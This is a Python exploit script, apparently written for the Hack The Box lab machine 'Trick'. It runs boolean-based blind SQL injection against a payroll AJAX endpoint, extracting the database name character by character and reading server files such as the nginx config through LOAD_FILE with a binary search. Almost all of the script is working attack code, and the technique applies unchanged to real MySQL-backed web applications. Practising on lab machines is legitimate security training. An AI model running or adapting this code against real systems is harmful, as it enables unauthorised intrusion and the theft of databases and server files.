import sys
import string
import requests
import inspect
from colorama import Fore, init

init(autoreset=True)

# --- Helper functions from your original script ---
def get_caller_info():
    frame = inspect.stack()[2]
    return frame

def printe(text):
    frame = get_caller_info(); line = frame.lineno; file = frame.filename
    print(f"\n{Fore.RED}[-] [{file}:{line}]: {text}")

def printd(text, flush=False, end="\n", r=""):
    print(f"{r}{Fore.MAGENTA}[DEBUG]: {text}", flush=flush, end=end)

def prints(text):
    print(f"\n{Fore.GREEN}[+] {text}")

def printi(text):
    print(f"\n{Fore.BLUE}[INFO] {text}")

class TrickExploiter:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.char_list = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
        self.char_list_domains = string.ascii_lowercase + string.digits + '.'
        
        # Target details
        self.database = ""
        self.tables = []

    def send_payload(self, payload):
        """
        Returns True if the 'Division by zero' warning is NOT in the response.
        (True = Injection was successful/Condition was true)
        """
        data = {"id": payload}
        try:
            # Note: headers may need adjustment based on your Burp request
            headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            resp = self.session.post(self.url, data=data, headers=headers, timeout=10)
            
            if "Division by zero" not in resp.text:
                return True
            else:
                return False
        except Exception as e:
            printe(f"Request failed: {e}")
            return False

    def get_database_name(self):
        printi("Extracting Database Name...")
        db_name = ""
        for i in range(1, 20): # Adjust range if needed
            found = False
            for ch in self.char_list:
                printd(f"Trying: {db_name}{ch}", flush=True, end="", r="\r")
                # Payload: id=2 OR (SUBSTR(DATABASE(),index,1)) = 'char'
                payload = f"2 OR (SUBSTR(DATABASE(), {i}, 1)) = '{ch}'"
                if self.send_payload(payload):
                    db_name += ch
                    found = True
                    break
            if not found:
                break
        self.database = db_name
        prints(f"Database Name: {self.database}")

    def get_tables(self):
        printi(f"Extracting tables for {self.database}...")
        # You can add logic here to count tables and then loop through names 
        # using 'LIMIT 0,1', 'LIMIT 1,1', etc., similar to your Soccer script.
        pass
    def read_file(self, filepath):
        printi(f"Reading file: {filepath}")
        extracted_data = ""
        
        for i in range(1, 4000): # Increased range for config files
            low = 0
            high = 126
            found_char = 0
            
            # Binary Search Logic
            while low <= high:
                mid = (low + high) // 2
                # If ASCII value is 0, we hit EOF
                if mid == 0:
                    payload = f"2 OR (SELECT ASCII(SUBSTR(LOAD_FILE('{filepath}'),{i},1)))=0"
                    if self.send_payload(payload):
                        prints(f"Reached End of File.")
                        print(f"\n{Fore.WHITE}{extracted_data}\n")
                        return extracted_data

                # Test if the character ASCII value is > mid
                payload = f"2 OR (SELECT ASCII(SUBSTR(LOAD_FILE('{filepath}'),{i},1))) > {mid}"
                if self.send_payload(payload):
                    low = mid + 1
                    found_char = low
                else:
                    high = mid - 1
                    found_char = low

            if found_char > 0:
                char = chr(found_char)
                extracted_data += char
                printd(f"Extracted: {extracted_data.replace(chr(10), ' ')}", r="\r", flush=True, end="")
            else:
                break

        return extracted_data

    def run(self):
        # self.get_database_name()
        self.read_file("/etc/nginx/sites-enabled/default")
        # Add more calls here as you build out the logic

if __name__ == "__main__":
    # Ensure this URL matches your AJAX endpoint
    target_url = "http://preprod-payroll.trick.htb/ajax.php?action=calculate_payroll"
    exploit = TrickExploiter(target_url)
    exploit.run()
